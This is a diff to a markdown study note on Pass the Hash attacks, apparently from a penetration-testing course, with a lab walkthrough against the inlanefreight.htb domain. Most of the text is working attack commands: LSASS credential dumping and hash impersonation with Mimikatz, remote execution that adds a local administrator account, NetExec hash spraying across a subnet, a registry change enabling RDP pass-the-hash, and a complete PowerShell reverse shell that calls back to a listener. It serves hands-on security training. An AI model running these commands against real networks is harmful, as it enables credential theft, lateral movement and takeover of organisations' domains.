@@ -1,10 +1,10 @@
-# 🔓 Pass the Hash (PtH)
+# Pass the Hash (PtH)
 
 > **Module Section:** 20 / 26 — Password Attacks
 
 ## Overview
 
-A **Pass the Hash (PtH)** attack is a technique where an attacker uses a password hash **instead of the plaintext password** for authentication. The attacker doesn't need to decrypt the hash — PtH exploits the authentication protocol itself, since the password hash remains static for every session until the password is changed.
+**Pass the Hash (PtH)** is an attack where an attacker uses a password hash instead of the actual password to authenticate. The attacker never needs to crack the hash. PtH works because the authentication protocol (NTLM) uses the hash itself as proof of identity. The hash stays the same until the user changes their password.
 
 ---
 
@@ -29,7 +29,7 @@ The attacker must have **administrative or specific privileges** on the target t
 
 ## Windows NTLM Background
 
-**NTLM** (New Technology LAN Manager) is Microsoft's set of security protocols for authentication via a **challenge-response** mechanism — no password needs to be provided during the session.
+**NTLM** (New Technology LAN Manager) is Microsoft's set of security protocols that authenticate users via a challenge-response mechanism. No password is ever sent over the network directly.
 
 | Property | Detail |
 |----------|--------|
@@ -42,11 +42,11 @@ The attacker must have **administrative or specific privileges** on the target t
 
 ---
 
-## 🪟 PtH from Windows
+## PtH from Windows
 
-### 🛠 Mimikatz — `sekurlsa::pth`
+### Mimikatz — `sekurlsa::pth`
 
-Starts a process using the hash of the user's password.
+Starts a new process (usually cmd.exe) running under the target user's identity using their NTLM hash — no password needed.
 
 #### Required Parameters
 
@@ -62,15 +62,16 @@ Starts a process using the hash of the user's password.
 ```cmd
 c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
 ```
+> Spawns a new cmd.exe process authenticated as julio using the NTLM hash. Commands run in that new window have julio's network access — including shares on the DC.
 
 #### Result
 A new `cmd.exe` runs with `julio`'s context — allowing access to resources like `\\DC\julio` share.
 
 ---
 
-### 🛠 Invoke-TheHash (PowerShell)
+### Invoke-TheHash (PowerShell)
 
-A collection of PowerShell functions for PtH via **WMI** and **SMB**, using `.NET TCPClient` connections. Authentication passes an NTLM hash into the NTLMv2 protocol.
+A set of PowerShell functions for PtH attacks via WMI (Windows Management Instrumentation) and SMB. It passes the NTLM hash through the NTLMv2 protocol using .NET TCP connections. No local admin is needed on the attacker machine — but the target account must have admin rights on the destination host.
 
 | Requirement | Detail |
 |-------------|--------|
@@ -95,6 +96,7 @@ PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefre
     -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B `
     -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
 ```
+> Imports the module and runs a command on the target via SMB using julio's hash. The `-Command` here creates a local admin account named mark. Use any command you need in that field.
 
 #### WMI Exec Example — Reverse Shell
 
@@ -103,6 +105,7 @@ PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefre
    ```powershell
    PS C:\tools> .\nc.exe -lvnp 8001
    ```
+   > Starts a netcat listener on port 8001. The reverse shell from DC01 will connect back here.
 
 2. Generate a base64 PowerShell payload at [revshells.com](https://www.revshells.com) (PowerShell #3 Base64).
 
@@ -113,22 +116,24 @@ PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefre
        -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B `
        -Command "powershell -e <BASE64_PAYLOAD>"
    ```
+   > Executes the base64-encoded PowerShell payload on DC01 via WMI using julio's hash. The reverse shell in the payload calls back to the listener you started in step 1.
 
 Result: Reverse shell from DC01 → attacker machine.
 
 ---
 
-## 🐧 PtH from Linux
+## PtH from Linux
 
-### 🛠 Impacket
+### Impacket
 
-Impacket provides multiple execution methods for PtH attacks.
+Impacket provides several tools for PtH attacks from Linux. Each tool uses a different protocol, offering different trade-offs between noise and functionality.
 
 #### `impacket-psexec`
 
 ```bash
 impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
 ```
+> Authenticates as Administrator using the NTLM hash (format is `LM:NTLM` — use an empty LM field with just the colon). Uploads a service binary to ADMIN$ and starts it, giving a SYSTEM shell.
 
 Output:
 ```
@@ -152,15 +157,16 @@ C:\Windows\system32>
 
 ---
 
-### 🛠 NetExec (`nxc`)
+### NetExec (`nxc`)
 
-Post-exploitation tool to automate Active Directory assessment — great for **password spraying** and identifying hosts where hash reuse grants access.
+NetExec automates Active Directory assessment. It is great for password spraying and for finding hosts where a hash grants access.
 
 #### Spray Hash Across a Subnet
 
 ```bash
 netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
 ```
+> Sprays the NTLM hash across every host in the subnet. `-d .` uses local account authentication. Hosts showing `(Pwn3d!)` accept the hash — those are targets for further exploitation.
 
 Output:
 ```
@@ -180,6 +186,7 @@ SMB  172.16.1.5   445  MS01  [+] .\Administrator ... (Pwn3d!)
 ```bash
 netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
 ```
+> Executes a command on the remote host using the hash. `-x` runs the command and prints the output. Useful for confirming access or quickly reading files without a full shell.
 
 > ⚠️ **Lockout risk:** Password spraying can lock domain accounts. Check the domain lockout policy first. Use `--local-auth` to avoid domain-wide lockouts.
 
@@ -187,44 +194,44 @@ netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF
 
 ---
 
-### 🛠 Evil-WinRM
+### Evil-WinRM
 
-Use **PowerShell Remoting (WinRM)** for PtH when SMB is blocked.
+Use Evil-WinRM for PtH over WinRM (Windows Remote Management) when SMB is blocked.
 
 ```bash
 evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
 ```
+> Opens an interactive PowerShell session on the target using the NTLM hash. `-H` takes just the NTLM portion. For domain accounts, use the UPN format: `administrator@inlanefreight.htb`.
 
 > 💡 For domain accounts, use the UPN format: `administrator@inlanefreight.htb`
 
 ---
 
-### 🛠 xfreerdp — PtH over RDP
+### xfreerdp — PtH over RDP
 
-Gain **GUI access** to the target via PtH.
+Use xfreerdp to gain GUI access to the target via PtH.
 
-#### ⚠️ Caveat — Restricted Admin Mode
+#### Caveat — Restricted Admin Mode
 
-Must be enabled on target, otherwise RDP will fail with:
-> *Account restrictions prevent signing in due to blank passwords, limited sign-in times, or policy restrictions.*
-
-#### Enable on Target
+Restricted Admin Mode must be enabled on the target. Otherwise RDP will fail with an error about account restrictions. Enable it first via the registry before connecting.
 
 ```cmd
 c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
+> Enables Restricted Admin Mode on the target by setting the registry key to 0. Run this via a command-exec method (NetExec `-x`, psexec, etc.) before attempting PtH RDP.
 
 #### Connect
 
 ```bash
 xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 ```
+> Connects via RDP using the NTLM hash instead of a password. `/pth:` takes the hash directly. Requires Restricted Admin Mode to be enabled on the target first.
 
 ---
 
-## ⚠️ UAC Limits PtH for Local Accounts
+## UAC Limits PtH for Local Accounts
 
-**UAC (User Account Control)** restricts local users from performing remote administration.
+**UAC (User Account Control)** restricts local accounts from performing remote administration tasks.
 
 ### Registry Key: `LocalAccountTokenFilterPolicy`
 
@@ -288,9 +295,9 @@ When enabled (value `1`, disabled by default), **RID-500 is enrolled in UAC prot
 
 ---
 
-## 🎯 Walkthrough — Full PtH Chain on `inlanefreight.htb`
+## Walkthrough — Full PtH Chain on `inlanefreight.htb`
 
-Worked example: pivot from external attacker → MS01 local Administrator → julio → DC01 via PtH using **Mimikatz**, **NetExec**, **xfreerdp**, and **Invoke-TheHash**.
+This walks through the full attack from the external attacker to DC01 using Mimikatz, NetExec, xfreerdp, and Invoke-TheHash.
 
 ### Lab Topology
 
@@ -308,6 +315,8 @@ Starting credential: local `Administrator` NTLM hash on MS01 → `30B3783CE2ABF1
 nxc smb 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453 \
     --local-auth -x "type C:\pth.txt"
 ```
+> Reads a file on the remote host using the NTLM hash. `--local-auth` forces local account authentication. A `(Pwn3d!)` result confirms local admin access.
+
 ✅ → `G3t_4CCE$$_V1@_PTH` (also confirms `(Pwn3d!)` — local admin via PtH).
 
 ### Step 2 — Enable Restricted Admin Mode for RDP PtH
@@ -318,12 +327,14 @@ By default xfreerdp PtH fails on Windows with *"Account restrictions prevent sig
 nxc smb 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth \
   -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
 ```
+> Enables Restricted Admin Mode on the target by running the reg command via PtH. This must be done before the xfreerdp PtH connection will work.
 
 Then connect RDP with the hash:
 
 ```bash
 xfreerdp /v:10.129.204.23 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
 ```
+> Connects via RDP using the NTLM hash. Opens a full desktop session as Administrator without knowing the password.
 
 > 🔑 Registry value: **`DisableRestrictedAdmin`** (set to `0` to allow PtH RDP).
 
@@ -335,6 +346,7 @@ In PowerShell, `mimikatz.exe` won't run from `cd` — must prefix with `.\`:
 cd C:\tools
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
 ```
+> Dumps all cached logon credentials from LSASS. Look for `User Name : david` (and other accounts) in the output and copy their NTLM hash values.
 
 Look for the `User Name : david` block — copy the `NTLM` value.
 This box yielded:
@@ -348,6 +360,8 @@ In RDP cmd:
 ```cmd
 C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:david /domain:inlanefreight.htb /ntlm:c39f2beb3d2ec06a62cb887fb391dee0 /run:cmd.exe" exit
 ```
+> Spawns a new cmd.exe running as david using his NTLM hash. Run file access commands in the new window that appears, not in the original one.
+
 A second cmd window opens; in **that** window:
 ```cmd
 type \\DC01\david\david.txt
@@ -359,6 +373,8 @@ type \\DC01\david\david.txt
 ```cmd
 C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:julio /domain:inlanefreight.htb /ntlm:64f12cddaa88057e06a81b54e73b949b /run:cmd.exe" exit
 ```
+> Same PtH spawn as Step 4, this time as julio. A new cmd window opens authenticated as julio.
+
 ```cmd
 type \\DC01\julio\julio.txt
 ```
@@ -374,6 +390,7 @@ DC01 has **no route to the attacker box** — only to MS01 (`172.16.1.5`). So th
 PAYLOAD='$client = New-Object System.Net.Sockets.TCPClient("172.16.1.5",8001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 echo -n "$PAYLOAD" | iconv -t UTF-16LE | base64 -w0
 ```
+> Builds a PowerShell reverse shell payload and base64-encodes it for use with `powershell -e`. The `-w0` flag prevents line wrapping. Paste the output as the value for the `-Command` parameter in the next step.
 
 > ⚠️ **Common typo:** I once wrote `$sendbyte = ([text.encoding]::ASCII).GetBytes($sendbyte2)` — must be `$sendback2`. The connection will succeed but no command output returns. Always verify the variable names match.
 
@@ -383,12 +400,14 @@ echo -n "$PAYLOAD" | iconv -t UTF-16LE | base64 -w0
 cd C:\tools
 .\nc.exe -lvnp 8001
 ```
+> Starts a netcat listener on MS01's internal IP. DC01 can only route to MS01, so the reverse shell must call back to MS01 — not the attacker's external IP.
 
 #### 6c. PtH spawn PowerShell as julio (in original RDP cmd)
 
 ```cmd
 C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:julio /domain:inlanefreight.htb /ntlm:64f12cddaa88057e06a81b54e73b949b /run:powershell.exe" exit
 ```
+> Spawns a new PowerShell window running as julio. Use this window (not the original) to load Invoke-TheHash and launch the WMI exec against DC01.
 
 #### 6d. In the spawned PS, fire Invoke-TheHash → DC01
 
@@ -399,6 +418,7 @@ Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio `
   -Hash 64f12cddaa88057e06a81b54e73b949b `
   -Command "powershell -e <BASE64_PAYLOAD>"
 ```
+> Runs the base64 payload on DC01 via WMI using julio's hash. Paste your actual base64 payload in place of `<BASE64_PAYLOAD>`. The command returns immediately — the reverse shell appears in the nc listener within a few seconds.
 
 Output: `[+] Command executed with process ID <pid> on DC01`
 
@@ -415,9 +435,9 @@ JuL1()_N3w_fl@g
 
 ---
 
-### 📝 Lessons Learned
+### Lessons Learned
 
-1. **NetExec `--local-auth -x` is the fastest one-shot** for PtH file reads — no shell needed.
+1. **NetExec `--local-auth -x`** is the fastest one-shot method for PtH file reads. No shell needed.
 2. **`DisableRestrictedAdmin = 0`** is required server-side for `xfreerdp /pth:` to work.
 3. **PowerShell doesn't auto-run executables from CWD** — always prefix with `.\` (`.\mimikatz.exe`, `.\nc.exe`).
 4. **Mimikatz `sekurlsa::pth` spawns a NEW window** running as the impersonated user. Run share/file commands in *that* window, not the original.
